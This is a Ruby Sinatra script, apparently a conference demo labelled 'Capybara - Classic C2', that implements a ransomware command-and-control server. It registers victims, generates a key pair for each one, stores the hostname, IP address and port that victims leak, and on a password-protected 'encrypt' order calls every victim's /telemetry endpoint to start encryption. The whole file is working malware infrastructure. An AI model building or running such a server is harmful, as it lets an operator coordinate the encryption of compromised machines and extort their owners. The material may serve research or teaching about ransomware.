#!/usr/bin/ruby
#Libraries
require 'sinatra'
require 'colorize'
require 'net/http'
require 'uri'

#Command password
command_password = "Advers@ry"

#Local variables
victim_id = 100000
victim_address = Hash.new
latest_victim = 0
latest_order = 0

#Not the ransomware part
puts "Capybara - Classic C2".light_red
puts "larm182 & mauroeldritch @ DC 5411.".light_red
set :bind, "0.0.0.0"
set :port, 4567

#Remove old keys
FileUtils.rm_rf Dir.glob("./keys/*")

#Information Endpoints
get ('/get_id') {
    victim_id = victim_id + 1
    latest_victim = victim_id
    puts "New victim compromised with ID #{latest_victim}.".light_red
    "#{victim_id}"
}

get ('/get_key') {
    `ssh-keygen -b 2048 -t rsa -f ./keys/#{latest_victim} -q -N ""`
    pubkey = File.read("./keys/#{latest_victim}.pub")
    puts "New key pair generated for victim with ID #{latest_victim}.".light_yellow
    "#{pubkey}"
}

post ('/leak') {
    @id = params[:id]
    @hostname  = params['hostname']
    @address = params['ipaddress']
    @port = params['port']
    victim_address["#{@id}"] = "#{@address}:#{@port}"
    puts "Victim ##{@id} leaked the following information: Hostname = #{@hostname} | Connection String: #{@address}:#{@port}.".light_yellow
    ""
}

post ('/encrypt') {
    @id = params[:id]
    puts "#{@id} has started an encryption cycle...".light_yellow
    ""
}

#Command Endpoints
post ('/order') {
    @order = params[:order]
    @password = params[:password]
    if @password.to_s == command_password
        if @order.to_s == "encrypt"
            puts "Sending 'encrypt' order to all...".light_red
            victim_address.each do |x,y|
                puts "Attempting to encrypt ##{x} (#{y})...".light_yellow
                begin
                    puts "\tFetching http://#{y}/telemetry...".light_blue
                    uri = URI.parse("http://#{y}/telemetry")
                    response = Net::HTTP.get_response(uri)
                rescue => e
                    puts "Failed to query #{y}: #{e}.".light_red
                    ""
                end
                ""
            end
        end
    else
        puts "Invalid Command Password supplied.".light_red
        ""
    end
}